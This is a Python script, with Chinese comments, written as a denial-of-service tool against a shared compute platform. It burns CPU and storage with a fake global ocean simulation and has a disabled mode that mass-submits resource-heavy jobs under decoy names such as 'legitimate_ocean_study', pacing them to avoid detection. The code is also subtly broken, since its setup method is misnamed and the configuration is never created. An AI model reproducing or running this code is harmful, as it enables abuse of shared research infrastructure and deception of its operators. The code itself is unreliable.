# malicious_dos_simulation.py
import numpy as np
import xarray as xr
from datetime import datetime, timedelta
import time
import os
from platform_sdk.job_submitter import JobSubmitter

class ResourceExhaustionAttacker:
    def __ittest__(self):
        # 攻击配置：最大化资源消耗的参数
        self.attack_config = {
            'simulation_duration_days': 365,  # 模拟1年，非常耗时
            'output_interval_seconds': 60,    # 每60秒输出一次，产生海量数据
            'grid_resolution_degree': 0.01,   # 超高分辨率（约1km），计算复杂度呈指数增长
            'simulation_domain': {            # 全球范围模拟，而非区域模拟
                'lon_min': -180,
                'lon_max': 180,
                'lat_min': -90,
                'lat_max': 90
            },
            'physical_processes': {           # 启用所有物理过程，增加计算负担
                'tides': True,
                'waves': True,
                'ice': True,
                'biogeochemistry': True       # 额外的生物地球化学过程，极其耗时
            },
            'redundant_variables': 50,        # 输出50个冗余变量，占满存储I/O
            'spinup_time_days': 365           # 额外的spin-up时间，再增加1年模拟
        }
        
    def _generate_redundant_data(self, time_steps, grid_size):
        """生成大量冗余数据来填充存储和网络"""
        print(f"    Generating redundant output data ({grid_size[0]}x{grid_size[1]} grid, {time_steps} steps)...")
        # 创建毫无科学价值的冗余数据维度
        redundant_vars = {}
        for i in range(self.attack_config['redundant_variables']):
            var_name = f'redundant_var_{i:03d}'
            # 填充随机数据
            data = np.random.rand(time_steps, grid_size[0], grid_size[1])
            redundant_vars[var_name] = (('time', 'lat', 'lon'), data)
            # 模拟沉重的I/O操作
            if i % 10 == 0:
                time.sleep(0.1)  # 增加延迟，模拟IO压力
        return redundant_vars

    def run_excessive_simulation(self):
        """执行资源消耗巨大的模拟"""
        print("[+] Starting 'high-resolution global ocean simulation'...")
        print(f"    Domain: {self.attack_config['simulation_domain']}")
        print(f"    Resolution: {self.attack_config['grid_resolution_degree']} degrees")
        print(f"    Duration: {self.attack_config['simulation_duration_days']} days")
        
        # 计算网格大小 - 会产生巨大的网格点数
        lat_range = self.attack_config['simulation_domain']['lat_max'] - self.attack_config['simulation_domain']['lat_min']
        lon_range = self.attack_config['simulation_domain']['lon_max'] - self.attack_config['simulation_domain']['lon_min']
        n_lat = int(lat_range / self.attack_config['grid_resolution_degree'])
        n_lon = int(lon_range / self.attack_config['grid_resolution_degree'])
        n_time = int(self.attack_config['simulation_duration_days'] * 86400 / self.attack_config['output_interval_seconds'])
        
        print(f"    Grid size: {n_lat} x {n_lon} = {n_lat * n_lon:,} grid points")
        print(f"    Time steps: {n_time}")
        print(f"    Total operations: ~{n_time * n_lat * n_lon:,}")
        
        # 模拟计算密集型循环
        total_simulation_time = 0
        for day in range(self.attack_config['simulation_duration_days']):
            day_start_time = time.time()
            
            # 模拟一天的计算 (极度简化)
            for hour in range(24):
                for minute in range(60):
                    # 模拟昂贵的数值计算 - 这里用空循环和随机计算消耗CPU
                    computation_intensity = 1000  # 控制计算强度的参数
                    for i in range(computation_intensity):
                        # 无意义的计算，纯粹消耗CPU周期
                        _ = np.sum(np.random.rand(1000) * np.random.rand(1000))
                    
                    # 频繁的进度输出，产生日志噪声
                    if minute % 30 == 0:
                        current_time = datetime.now().strftime("%H:%M:%S")
                        print(f"        Simulating: Day {day+1}, {hour:02d}:{minute:02d} - {current_time}")
            
            day_elapsed = time.time() - day_start_time
            total_simulation_time += day_elapsed
            print(f"    Completed day {day+1}/{self.attack_config['simulation_duration_days']}. "
                  f"Day time: {day_elapsed:.1f}s, Total: {total_simulation_time:.1f}s")
        
        # 生成并输出海量冗余数据
        print("[+] Simulation 'completed'. Generating output files...")
        grid_size = (n_lat, n_lon)
        redundant_data = self._generate_redundant_data(n_time, grid_size)
        
        # 创建巨大的NetCDF文件
        output_filename = "excessive_simulation_output.nc"
        print(f"    Writing massive output to {output_filename}...")
        
        # 模拟沉重的IO操作 - 长时间占用存储带宽
        for i in range(100):
            # 模拟写入大量数据块
            time.sleep(0.5)  # 模拟IO等待
            print(f"        Writing data chunk {i+1}/100...")
        
        print(f"    Output completed. File size: ~{n_time * n_lat * n_lon * 4 / (1024**3):.1f} GB")
        
        return total_simulation_time

    def launch_distributed_attack(self, num_concurrent_jobs=10):
        """发起分布式攻击 - 同时提交多个资源消耗任务"""
        print(f"[+] Launching distributed attack with {num_concurrent_jobs} concurrent jobs...")
        
        job_ids = []
        for i in range(num_concurrent_jobs):
            job_name = f"legitimate_ocean_study_{i}"
            job_config = {
                'name': job_name,
                'cpu_cores': 32,  # 请求大量CPU核心
                'memory_gb': 64,   # 请求大量内存
                'gpu_count': 2,    # 请求GPU资源（即使不需要）
                'timeout_hours': 72  # 长时间运行
            }
            
            try:
                # 提交任务
                job_id = JobSubmitter.submit_job(
                    image="ocean-modeling-suite:latest",
                    command="python malicious_dos_simulation.py",
                    resources=job_config
                )
                job_ids.append(job_id)
                print(f"    Submitted job {i+1}/{num_concurrent_jobs}: ID {job_id}")
                time.sleep(0.5)  # 短暂延迟，避免提交过快被检测
                
            except Exception as e:
                print(f"    Failed to submit job {i+1}: {e}")
        
        return job_ids

def main():
    attacker = ResourceExhaustionAttacker()
    
    # 单任务攻击模式
    print("[MODE 1] Single task resource exhaustion")
    try:
        total_time = attacker.run_excessive_simulation()
        print(f"[+] Single task completed in {total_time:.1f} seconds")
    except KeyboardInterrupt:
        print("\n[!] Simulation interrupted by user")
    
    # 分布式攻击模式 (注释掉，需要时启用)
    # print("\n[MODE 2] Distributed DoS attack")
    # job_list = attacker.launch_distributed_attack(num_concurrent_jobs=5)
    # print(f"[+] Distributed attack launched. {len(job_list)} jobs submitted.")
    
    print("[+] Resource exhaustion attack sequence completed.")

if __name__ == "__main__":
    main()